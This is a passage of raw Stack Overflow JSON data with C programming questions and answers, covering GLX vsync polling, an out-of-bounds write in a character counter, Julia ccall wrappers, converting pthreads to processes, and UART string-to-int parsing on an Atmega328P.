"https://graph.facebook.com/1676693082590391/picture?type=large", "display_name": "Lewis Anesa", "link": "https://stackoverflow.com/users/6090734/lewis-anesa"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1558, "favorite_count": 0, "accepted_answer_id": 36888778, "answer_count": 2, "score": 1, "last_activity_date": 1589018768, "creation_date": 1461756066, "question_id": 36888288, "link": "https://stackoverflow.com/questions/36888288/glx-vsync-event", "title": "GLX Vsync event", "body": "<p>I'm wondering if I could catch the screen vsync event by any file descriptor and [select | poll | epoll]ing it.</p>\n\n<p>Normally, if I'm right, glXSwapBuffers() doesn't block the process so I could do something like :</p>\n\n<pre><code>int init() {\n    create epollfd;\n    add Xconnection number to it;\n    add some other fd like socket timer tty etc...\n    possibly add a vsync fd like dri/card0 or fb0 or other???\n    return epollfd;\n}\n\nmain() {\n    int run = 1;\n    int epollfd = init();\n\n    while(run) {\n        epoll_wait(epollfd, ...) {\n\n        if(trigedfd = socket) {\n            do network computing;\n        }\n\n        if(trigedfd = timer) {\n            do physics computing;\n        }\n\n        if(trigedfd = tty) {\n            do electronic communications;\n        }\n\n        if(trigedfd = Xconnection number) {\n            switch(Xevent) {\n                case key event:\n                    do key computing;\n                case mouse event:\n                    do mouse computing;\n                case vsync???:\n                    do GL computings;\n                    glXSwapBuffers();\n            }\n        }\n\n        if(trigedfd = dri/card0 or fb0 or other???) {\n            do GL computings;\n            glXSwapBuffers();\n        }\n    }\n}\n</code></pre>\n\n<p>So I could then I could trig any event regardless when vsync event happen and avoid by the same time tearing effect in the case where I use only X drawing function and possibly GL for vsync.</p>\n\n<p>Could libdrm help me? the more general question is :</p>\n\n<p>So what fd do I have to use to catch vsync event and how to make shure on this fd that the event that happened is a vsync event?</p>\n"}, {"tags": ["c", "memory", "malloc", "calloc"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1461755404, "post_id": 36887990, "comment_id": 61340343, "body": "Aside: <code>printf(&quot;alocated at = %p\\n&quot;, &amp;buffer);</code> --&gt; <code>printf(&quot;alocated at = %p\\n&quot;, (void*)buffer);</code>"}, {"owner": {"reputation": 734, "user_id": 3235081, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/iSyXb.png?s=128&g=1", "display_name": "Shady Programmer", "link": "https://stackoverflow.com/users/3235081/shady-programmer"}, "edited": false, "score": 0, "creation_date": 1461755745, "post_id": 36887990, "comment_id": 61340610, "body": "One of the problems lies on this line - <code>counts [ (int)(buffer[i]) ]++</code> When you cast char to an int it gives you the ascii representation , not the actual char that you see being converted to a number."}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1461755857, "post_id": 36887990, "comment_id": 61340670, "body": "<code>buffer[length] = &#39;\\0&#39;;</code> out of bounds."}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 1, "creation_date": 1461756048, "post_id": 36887990, "comment_id": 61340802, "body": "Is <code>tekst.txt</code> 7bit code?"}, {"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "reply_to_user": {"reputation": 734, "user_id": 3235081, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/iSyXb.png?s=128&g=1", "display_name": "Shady Programmer", "link": "https://stackoverflow.com/users/3235081/shady-programmer"}, "edited": false, "score": 0, "creation_date": 1461756057, "post_id": 36887990, "comment_id": 61340813, "body": "@ShadyProgrammer: I would guess that&#39;s the purpose of this program. (I foresee huge problems when the text file contains characters outside the plain ASCII range. Maybe that is not an issue, but then again it may be.)"}, {"owner": {"reputation": 7, "user_id": 6092805, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/df625f231847451dc757a8d021dccec8?s=128&d=identicon&r=PG&f=1", "display_name": "noissue", "link": "https://stackoverflow.com/users/6092805/noissue"}, "edited": false, "score": 0, "creation_date": 1461756247, "post_id": 36887990, "comment_id": 61340947, "body": "yes tekst.txt is ascii 7bit"}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1461756429, "post_id": 36887990, "comment_id": 61341072, "body": "delete first <code>charBuffer[i] = counts[i];</code>"}], "answers": [{"tags": [], "owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "is_accepted": false, "score": 2, "last_activity_date": 1461755648, "creation_date": 1461755648, "answer_id": 36888150, "question_id": 36887990, "link": "https://stackoverflow.com/questions/36887990/c-memory-allocation-with-file-input/36888150#36888150", "title": "C memory allocation with File input", "body": "<p>In this line</p>\n\n<pre><code>charBuffer[i] = counts[i];\n</code></pre>\n\n<p>you will overflow <code>charBuffer[128]</code> when the file size is >= 128, since <code>i</code> is indexing by up to the length of the file.</p>\n"}, {"comments": [{"owner": {"reputation": 7, "user_id": 6092805, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/df625f231847451dc757a8d021dccec8?s=128&d=identicon&r=PG&f=1", "display_name": "noissue", "link": "https://stackoverflow.com/users/6092805/noissue"}, "edited": false, "score": 0, "creation_date": 1461756929, "post_id": 36888154, "comment_id": 61341407, "body": "my fault i didnt saw that"}], "tags": [], "owner": {"reputation": 5818, "user_id": 978558, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/d023acf70b927cb813b48631195e346e?s=128&d=identicon&r=PG", "display_name": "fredrik", "link": "https://stackoverflow.com/users/978558/fredrik"}, "is_accepted": true, "score": 1, "last_activity_date": 1461755677, "creation_date": 1461755677, "answer_id": 36888154, "question_id": 36887990, "link": "https://stackoverflow.com/questions/36887990/c-memory-allocation-with-file-input/36888154#36888154", "title": "C memory allocation with File input", "body": "<p>In your <code>char_counter</code> function you do</p>\n\n<pre><code>charBuffer[i] = counts[i];\n</code></pre>\n\n<p>in the first for loop but buffer is only defined to be 128 ints. If  the text is longer than 128 characters this will cause a buffer overflow and a segmentation fault.</p>\n\n<p>Remove that line and let the 2nd for loop do it.</p>\n"}], "owner": {"reputation": 7, "user_id": 6092805, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/df625f231847451dc757a8d021dccec8?s=128&d=identicon&r=PG&f=1", "display_name": "noissue", "link": "https://stackoverflow.com/users/6092805/noissue"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 276, "favorite_count": 0, "accepted_answer_id": 36888154, "answer_count": 2, "score": -2, "last_activity_date": 1461755677, "creation_date": 1461755190, "question_id": 36887990, "link": "https://stackoverflow.com/questions/36887990/c-memory-allocation-with-file-input", "title": "C memory allocation with File input", "body": "<p>Hello i have a problem with memory allocation, </p>\n\n<ol>\n1. open file\n</ol>\n\n<ol>\n2. take lenght of text inside\n</ol>\n\n<ol>\n3. make buffer in size of lenght (array[] ? malloc ?)\n</ol>\n\n<ol>\n4. make operations on text in buffer.\n</ol>\n\n<ol>\n5. close\n</ol>\n\n<p>it terminates when text any longer than 1xx characters i have no idea whats going on.\n<br><strong>ps</strong>.attention! im learning and quality of this code can be bad</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid copy_to_buffer(FILE *fp, int length, char *buffer){\n    for(int i = 0; i &lt; length; i++){\n        char c = fgetc(fp);\n        buffer[i] = c;\n    }\n}\nint length_of_text(FILE *fp) {\n    fseek(fp, 0L, SEEK_END);\n    int size = ftell(fp);\n    rewind(fp);\n    return size;\n}\n\nvoid char_counter(int length, char *buffer, int *charBuffer) {\n    int counts[128] = { 0 };\n    for (int i = 0; i &lt; length; i++) {\n        counts[(int)(buffer[i])]++;\n        charBuffer[i] = counts[i];\n    }\n    for (int i = 0; i &lt; 128; i++) {\n        charBuffer[i] = counts[i];\n        if(counts[i] != 0)\n            printf(\"%d.(%c) counted: %d times.\\n\", i,i, counts[i]);\n    }\n}\n/***********************************MAIN***********************************/\nint main(int argc, char** argv) {\n\n    FILE *fp = fopen(\"tekst.txt\" , \"r\");\n    int length = length_of_text(fp);                //lenght of text\n    char *buffer = malloc(sizeof(char)*length);     //buffer for text from file\n    if(buffer == NULL) \n        printf(\"error\");\n    else\n        printf(\"alocated at = %p\\n\", &amp;buffer);\n\n    int charBuffer[128] = {0}; // charcount buffer\n    buffer[length] = '\\0';   // '\\0' after last sign\n    copy_to_buffer(fp, length, buffer); \n    char_counter(length, buffer, charBuffer); \n\n    free(buffer);\n    fclose(fp);     \n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "julia"], "comments": [{"owner": {"reputation": 13210, "user_id": 764322, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/a059b390ab24839995cfe14e261ffe41?s=128&d=identicon&r=PG", "display_name": "Imanol Luengo", "link": "https://stackoverflow.com/users/764322/imanol-luengo"}, "edited": false, "score": 0, "creation_date": 1461774098, "post_id": 36887830, "comment_id": 61355181, "body": "<i>void</i> just means <i>no-parameters</i> :S"}, {"owner": {"reputation": 760, "user_id": 5475794, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/wXmrI.gif?s=128&g=1", "display_name": "python\u5fc5\u987b\u6b7b", "link": "https://stackoverflow.com/users/5475794/python%e5%bf%85%e9%a1%bb%e6%ad%bb"}, "edited": false, "score": 0, "creation_date": 1462211250, "post_id": 36887830, "comment_id": 61531298, "body": "^_^\u5c0f\u90ed\uff0c\u4f60\u597d~~&#183;&#183;&#183;&#183;&#183;&#183;&#183;&#183;&#183;&#183;&#183;&#183;&#183;"}], "answers": [{"tags": [], "owner": {"reputation": 735, "user_id": 4630640, "user_type": "registered", "accept_rate": 93, "profile_image": "https://lh5.googleusercontent.com/-976wd8ogDyM/AAAAAAAAAAI/AAAAAAAAAHQ/07BDnEQ_GxY/photo.jpg?sz=128", "display_name": "Lanting Guo", "link": "https://stackoverflow.com/users/4630640/lanting-guo"}, "is_accepted": true, "score": 3, "last_activity_date": 1461762902, "creation_date": 1461762902, "answer_id": 36890935, "question_id": 36887830, "link": "https://stackoverflow.com/questions/36887830/how-to-deal-with-c-void-in-julia-v0-4/36890935#36890935", "title": "how to deal with c void in Julia v0.4", "body": "<p><code>ccall((:bam_hdr_init,\"lib.so\"), Ptr{bam_hdr_t},())</code> works for both versions of Julia</p>\n"}], "owner": {"reputation": 735, "user_id": 4630640, "user_type": "registered", "accept_rate": 93, "profile_image": "https://lh5.googleusercontent.com/-976wd8ogDyM/AAAAAAAAAAI/AAAAAAAAAHQ/07BDnEQ_GxY/photo.jpg?sz=128", "display_name": "Lanting Guo", "link": "https://stackoverflow.com/users/4630640/lanting-guo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 70, "favorite_count": 0, "accepted_answer_id": 36890935, "answer_count": 1, "score": 2, "last_activity_date": 1461762902, "creation_date": 1461754727, "question_id": 36887830, "link": "https://stackoverflow.com/questions/36887830/how-to-deal-with-c-void-in-julia-v0-4", "title": "how to deal with c void in Julia v0.4", "body": "<p>The exposed API from c is:</p>\n\n<pre><code>bam_hdr_t *bam_hdr_init(void);\n</code></pre>\n\n<p>how do I write its wrapper in Julia?</p>\n\n<p><code>ccall((:bam_hdr_init,\"lib.so\"), Ptr{bam_hdr_t})</code> works in Julia v0.5, but not in v0.4.</p>\n"}, {"tags": ["c", "multithreading", "process"], "comments": [{"owner": {"reputation": 351, "user_id": 3379534, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/250d20a8387d013d5c73684bb0bc2b25?s=128&d=identicon&r=PG&f=1", "display_name": "Linuxxon", "link": "https://stackoverflow.com/users/3379534/linuxxon"}, "edited": false, "score": 0, "creation_date": 1461754337, "post_id": 36887572, "comment_id": 61339621, "body": "You could use any form of <a href=\"https://en.wikipedia.org/wiki/Inter-process_communication\" rel=\"nofollow noreferrer\">IPC</a> to implement message passing, that&#39;s a good start. You can do this with sockets or named/anonymous pipes etc. Read the link to get started (;"}, {"owner": {"reputation": 294, "user_id": 759501, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a982a46f66853f3b2a5d444ed8caca34?s=128&d=identicon&r=PG", "display_name": "Alex Jones", "link": "https://stackoverflow.com/users/759501/alex-jones"}, "edited": false, "score": 0, "creation_date": 1461755049, "post_id": 36887572, "comment_id": 61340099, "body": "You could restructure your code and use <a href=\"http://linux.die.net/man/2/fork\" rel=\"nofollow noreferrer\">fork</a> a child process and a pipe between to send/receive data. Bare in mind you&#39;d need to keep the parent process in some sort of loop whilst the children are working."}], "answers": [{"tags": [], "owner": {"reputation": 3845, "user_id": 5982110, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3697e0ab47bfe2f56ade505b61527f23?s=128&d=identicon&r=PG&f=1", "display_name": "rpy", "link": "https://stackoverflow.com/users/5982110/rpy"}, "is_accepted": true, "score": 1, "last_activity_date": 1461754962, "creation_date": 1461754962, "answer_id": 36887913, "question_id": 36887572, "link": "https://stackoverflow.com/questions/36887572/thread-to-process/36887913#36887913", "title": "Thread to process", "body": "<p>For using processes instead of threads you will need to replace <code>pthread_create()</code> calls with a method that uses <code>fork()</code>.</p>\n\n<p>The parent process then will continue locally with what is now after your <code>pthread_create()</code>s. </p>\n\n<p>The child will then call the method being passed in. </p>\n\n<p>The <code>pid</code> of the newly created processes will take the role of <code>tid</code>.</p>\n\n<p>As you already seem to be using posix semaphores this will continue to work. However, you will need to use named semaphores (see <code>sem_open</code>) and use this also in the child processes (before calling your methods) to share the semaphores among your processes.</p>\n"}], "owner": {"reputation": 9, "user_id": 6260961, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/319279e881cc1c832e2939d0b3780032?s=128&d=identicon&r=PG&f=1", "display_name": "Mr. Robot", "link": "https://stackoverflow.com/users/6260961/mr-robot"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 46, "favorite_count": 0, "accepted_answer_id": 36887913, "answer_count": 1, "score": -1, "last_activity_date": 1461754962, "creation_date": 1461753916, "last_edit_date": 1461754801, "question_id": 36887572, "link": "https://stackoverflow.com/questions/36887572/thread-to-process", "title": "Thread to process", "body": "<p>How can I rewrite this code to using process not thread? I try to learning process programming in C language. I don't have any idea how can I do this. This code uses thread. More info about this algoritmus is here on page 153 - 158 :</p>\n\n<p><a href=\"http://www.greenteapress.com/semaphores/downey08semaphores.pdf\" rel=\"nofollow\">http://www.greenteapress.com/semaphores/downey08semaphores.pdf</a> </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;semaphore.h&gt;\n#include &lt;pthread.h&gt;\n\n#define MAX_PASSENGERS 500\n\nsem_t loading, loaded, unloading, unloaded;\n\nint n, c;\n\nvoid *passenger (void *tid) {\n  int i = *((int*) tid);\n\n  while (1) {\n\n    sem_wait(&amp;loading);\n    printf(\"pass(i=%d).board()\\n\", i);\n    sem_post(&amp;loaded);\n\n    sem_wait(&amp;unloading);\n    printf(\"pass(i=%d).unboard()\\n\", i);\n    sem_post(&amp;unloaded);\n\n  }\n}\n\nvoid *roller_coaster () {\n  while (1) {\n\n    printf(\"car.load(c=%d)\\n\", c);\n    for (int i = 0; i &lt; c; i++) {\n      sem_post(&amp;loading);\n    }\n\n    // wait for c passengers to load\n    for (int i = 0; i &lt; c; i++) {\n      sem_wait(&amp;loaded);\n    }\n\n    printf(\"car.run()\\n\");\n\n    sleep(1);\n\n    printf(\"car.unload(c=%d)\\n\", c);\n    for (int i = 0; i &lt; c; i++) {\n      sem_post(&amp;unloading);\n    }\n\n    // wait for c passengers to unload\n    for (int i = 0; i &lt; c; i++) {\n      sem_wait(&amp;unloaded);\n    }\n\n  }\n}\n\nint main () {\n\n  printf(\"Number of passengers(n, n &lt;= 500): \");\n  scanf(\"%d\", &amp;n);\n  printf(\"Number of passengers per cart(c, c &lt; n): \");\n  scanf(\"%d\", &amp;c);\n\n  sem_init(&amp;loading, 0, 0);\n  sem_init(&amp;unloading, 0, 0);\n\n  sem_init(&amp;loaded, 0, 0);\n  sem_init(&amp;unloaded, 0, 0);\n\n  pthread_t car;\n  pthread_t tid[MAX_PASSENGERS];\n\n  int my_ids[MAX_PASSENGERS];\n\n  pthread_create(&amp;car, NULL, roller_coaster, NULL);\n\n  for (int i = 0; i &lt; n; i++) {\n    my_ids[i] = i;\n    pthread_create(&amp;tid[i], NULL, passenger, &amp;my_ids[i]);\n  }\n\n  pthread_join(car, NULL);\n\n  return 0;\n}\n</code></pre>\n\n<p>Thanks for any help guys</p>\n"}, {"tags": ["c", "string", "type-conversion", "microcontroller", "interrupt"], "comments": [{"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1461752508, "post_id": 36886920, "comment_id": 61338339, "body": "This string, it is complete yes?  Including its null-terminator?  Fully transferred by whatever protocol you use, before attempting any atoi() or strxxx() calls?"}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1461752922, "post_id": 36886920, "comment_id": 61338620, "body": "Also, what baud rate are you using?  For such calls to impede interrupt-handling, the rate must be higher than [extremely high]."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1461753013, "post_id": 36886920, "comment_id": 61338700, "body": ".... especially with a 16 byte hardware FIFO."}, {"owner": {"reputation": 1964, "user_id": 1320881, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b69670b7cc6bce132f443eee557c9448?s=128&d=identicon&r=PG", "display_name": "Unimportant", "link": "https://stackoverflow.com/users/1320881/unimportant"}, "edited": false, "score": 2, "creation_date": 1461753189, "post_id": 36886920, "comment_id": 61338812, "body": "You&#39;re not performing the conversion in the interrupt service routine by any chance ? The ISR should simply save the data somewhere and the main program flow should perform the conversion."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 1, "creation_date": 1461754243, "post_id": 36886920, "comment_id": 61339549, "body": "Meh - it&#39;s a trivial function, even when performed in an interrupt-handler.  It would probably be even better run char-by-char as the data comes in, multipying an accumulator by 10 and adding the &#39;char-0x30&#39; until a null comes in, (or CR, or LF, or whatever/however the protocol works)."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 1, "creation_date": 1461754324, "post_id": 36886920, "comment_id": 61339608, "body": "Anyway, I&#39;m VTC as &#39;unclear&#39; unless OP provides more details of the code and protocol."}], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user4947869"}, "edited": false, "score": 0, "creation_date": 1462283955, "post_id": 36893660, "comment_id": 61564969, "body": "I&#39;ve implemented your <code>parse_num</code> function at it works great. But now I found my problem: If I stop every interrupt from working and use polling for UART it works great even at a speed of 250kBaud. But if I activate the interrupt Compare Match A (I need it for updating values at a TLC5940 PWM timer) and it is called every 4095 clock cycles it stops my UART receiving from working. Is there something I can do to stop blocking my UART receiving? In the interrupt a pin is toggled and a SPI-Transmission is fulfilled."}, {"owner": {"reputation": 905, "user_id": 2638371, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/uZefP.png?s=128&g=1", "display_name": "imbearr", "link": "https://stackoverflow.com/users/2638371/imbearr"}, "edited": false, "score": 0, "creation_date": 1462349671, "post_id": 36893660, "comment_id": 61594772, "body": "@jannik1810, are you shure that only UART stops? Usually same behaviour when new code content some errors that stop whole MCU."}, {"owner": {"user_type": "does_not_exist", "display_name": "user4947869"}, "edited": false, "score": 0, "creation_date": 1462392972, "post_id": 36893660, "comment_id": 61624562, "body": "I&#39;ve looked into my Compare Match A interrupt and found out that the SPI transmission is the process which takes a long time. I&#39;ve changed it to send a header via UART and that it stops the SPI transmission until UART is finished. So this works but some values are also missed in the transmission. And i&#39;m sure that the MCU keeps working."}, {"owner": {"reputation": 905, "user_id": 2638371, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/uZefP.png?s=128&g=1", "display_name": "imbearr", "link": "https://stackoverflow.com/users/2638371/imbearr"}, "edited": false, "score": 0, "creation_date": 1462734234, "post_id": 36893660, "comment_id": 61749373, "body": "@jannik1810, it seems you have exhausted processor&#39;s time. If it&#39;s right guess: try to optimize code(decrease irq handlers process time), increase MCU clock, decrease SPI/USART clock - each of these methods increase processor time."}, {"owner": {"user_type": "does_not_exist", "display_name": "user4947869"}, "edited": false, "score": 0, "creation_date": 1462884563, "post_id": 36893660, "comment_id": 61816823, "body": "i&#39;ve optimized the irq handler (now it only toggles a pin for the pwm Driver) and then the rest is handled by the main Loop of the program. I&#39;m checking for Special characters to symbolize the end of Transmission to start spi Transmission only if no more uart smybols are awaited. I hope it will work I will try it today."}], "tags": [], "owner": {"reputation": 905, "user_id": 2638371, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/uZefP.png?s=128&g=1", "display_name": "imbearr", "link": "https://stackoverflow.com/users/2638371/imbearr"}, "is_accepted": true, "score": 0, "last_activity_date": 1463379773, "last_edit_date": 1495542236, "creation_date": 1461769337, "answer_id": 36893660, "question_id": 36886920, "link": "https://stackoverflow.com/questions/36886920/c-atmega328p-string-to-int-conversion-blocks-rx-interrupt/36893660#36893660", "title": "C Atmega328P String to Int Conversion blocks RX Interrupt", "body": "<p><strong>If you need to convert multicharacter numbers</strong> to integer you need to use buffer. There example of cycle buffer uses:</p>\n\n<pre><code>#define BUF_LEN    128\n#define BUF_MSK    (BUF_LEN-1)\n\nuint8_t buf[BUF_LEN], b_in = 0, b_out = 0;\n\nvoid usart_irq_handler(void)\n{\n    buf[b_in&amp;BUF_MSK] = USART_DATA_REG;\n    b_in++;\n}\n\nint main(void)\n{\n    uint8_t tmp;\n    while (b_in!=b_out) {\n        tmp = buf[b_out&amp;BUF_MSK];\n        b_out++;\n        // parse here\n    }\n}\n</code></pre>\n\n<p><strong>If you need to convert single character numbers</strong> you may not use buffer (but if USART frequency not much less than CPU frequency it's not recommended). For ASCII encoded received characters each number will have values 0x30..0x39. If received characters encoded with another charset you need refer to their tables.</p>\n\n<pre><code>uint8_t num  = USART_DATA_REG - 0x30;\nif (num &gt;= 0 &amp;&amp; num &lt;= 9) {\n    // is number\n}\n</code></pre>\n\n<p><strong>EDIT 1</strong> <em>[due to new information from OP]</em> <strong>For convert decimal number from string to integer</strong> I use this function:</p>\n\n<pre><code>uint32_t parse_num(uint8_t * ptr) \n{\n    uint32_t res = (uint32_t)0x0;\n    uint8_t chr = 0x0, pchr = 0xA;\n    while (*ptr != (uint8_t)0x0) {\n        chr = (uint8_t)(*ptr - (uint8_t)0x30);\n        if (chr &lt; 0xA) {\n            res *= (uint32_t) 0xA;\n            res += (uint32_t) chr;\n        } else {\n            if (pchr &lt; 0xA) break;\n        }\n        pchr = chr;\n        ptr++;\n    }\n    return res;\n}\n</code></pre>\n\n<p>It skip non-numbers chars and convert first founded number, but doesn't return final position of parse buffer. You can modify it as you need.</p>\n\n<p><strong>EDIT 2</strong> <em>[due to chat with OP]</em> <strong>about good approach to processor time management:</strong></p>\n\n<p>Pictures below (from this <a href=\"https://stackoverflow.com/questions/24556281/how-to-illustrate-an-interrupt-driven-process\">answer</a>) illustrate normal processor timing in program:</p>\n\n<p><a href=\"https://i.stack.imgur.com/gPcd3.gif\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/gPcd3.gif\" alt=\"programm flows priorities\"></a></p>\n\n<p><a href=\"https://i.stack.imgur.com/ZAKs6.gif\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/ZAKs6.gif\" alt=\"programm time\"></a></p>\n\n<p>So, <strong>the smaller the interrupt handler time</strong> - the more likely success of the other handlers, and more time to perform main process.</p>\n\n<p>By <strong>increasing of MCU clock</strong> is reduced run time code and increases idle time.</p>\n\n<p>By <strong>decreasing of periferal clock</strong> is reduced frequency of interrupts by perifery and increases idle time.</p>\n\n<p>In conclusion <strong>idle time must be used for power save</strong>.</p>\n"}, {"tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user4947869"}, "is_accepted": false, "score": 0, "last_activity_date": 1461875609, "creation_date": 1461875609, "answer_id": 36924951, "question_id": 36886920, "link": "https://stackoverflow.com/questions/36886920/c-atmega328p-string-to-int-conversion-blocks-rx-interrupt/36924951#36924951", "title": "C Atmega328P String to Int Conversion blocks RX Interrupt", "body": "<p>Yes, the function runs in main loop and copies the chars out of buffer which is filled in the interrupt routine. After detecting the \\n in string, it converts the string into values using sscanf or char by char. I've first used a very slow baud rate and then a very fast one. There are also two more interrupt routines (for timing of 100us and one for a pwm driver). I've tried to take out code of these routines to speed them up and it was successful. Now the interrupt routine gets every character of the uart transmission. Now I am implementing an algorithm to convert the strings to values without using sscanf because of performance issues. Using the algorithm of imbearr with -0x30 should work properly.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user4947869"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 195, "favorite_count": 0, "accepted_answer_id": 36893660, "answer_count": 2, "score": 0, "last_activity_date": 1463379773, "creation_date": 1461752201, "last_edit_date": 1461752537, "question_id": 36886920, "link": "https://stackoverflow.com/questions/36886920/c-atmega328p-string-to-int-conversion-blocks-rx-interrupt", "title": "C Atmega328P String to Int Conversion blocks RX Interrupt", "body": "<p>i've used an Atmega328P \u00b5C to get a string over UART and convert it to an <code>int</code>. </p>\n\n<p>I've tried to use <code>atoi()</code> function or <code>sscanf()</code> to convert it but they are taking to long to convert so that they are blocking the interrupt. </p>\n\n<p>If I stop converting and just receiving over UART all symbols are transmitted but if I convert after receiving some characters of transmission are missed. </p>\n\n<p>Is there any way to speed up conversion to stop blocking RX interrupt?</p>\n"}, {"tags": ["c", "syntax", "variable-assignment", "logical-operators"], "comments": [{"owner": {"reputation": 34174, "user_id": 65464, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/d1fc3a85db4ff7618a7639742f356b3b?s=128&d=identicon&r=PG", "display_name": "Erich Kitzmueller", "link": "https://stackoverflow.com/users/65464/erich-kitzmueller"}, "edited": false, "score": 4, "creation_date": 1461751998, "post_id": 36886762, "comment_id": 61337982, "body": "<code>int ch == fgetc(stdin);</code> is probably a bug, should be <code>int ch = fgetc(stdin);</code> (<code>=</code> instead of <code>==</code>)"}], "answers": [{"comments": [{"owner": {"reputation": 424, "user_id": 5576024, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/HqOM5.jpg?s=128&g=1", "display_name": "Alon", "link": "https://stackoverflow.com/users/5576024/alon"}, "edited": false, "score": 1, "creation_date": 1461752090, "post_id": 36886804, "comment_id": 61338039, "body": "You are right, no magic. Thanks for a clear and simple answer."}], "tags": [], "owner": {"reputation": 34174, "user_id": 65464, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/d1fc3a85db4ff7618a7639742f356b3b?s=128&d=identicon&r=PG", "display_name": "Erich Kitzmueller", "link": "https://stackoverflow.com/users/65464/erich-kitzmueller"}, "is_accepted": false, "score": 7, "last_activity_date": 1461751939, "creation_date": 1461751939, "answer_id": 36886804, "question_id": 36886762, "link": "https://stackoverflow.com/questions/36886762/how-does-the-sequence-of-execution-determined-when-multiple-operators-are-involv/36886804#36886804", "title": "How does the sequence of execution determined when multiple operators are involved?", "body": "<pre><code>EOLorEOFfound = ch == '\\n' || ch == EOF;\n</code></pre>\n\n<p>does the same as</p>\n\n<pre><code>EOLorEOFfound = (ch == '\\n' || ch == EOF);\n</code></pre>\n\n<p>that is, assigning the result of a boolean expression to a variable. No magic here.</p>\n"}, {"tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": 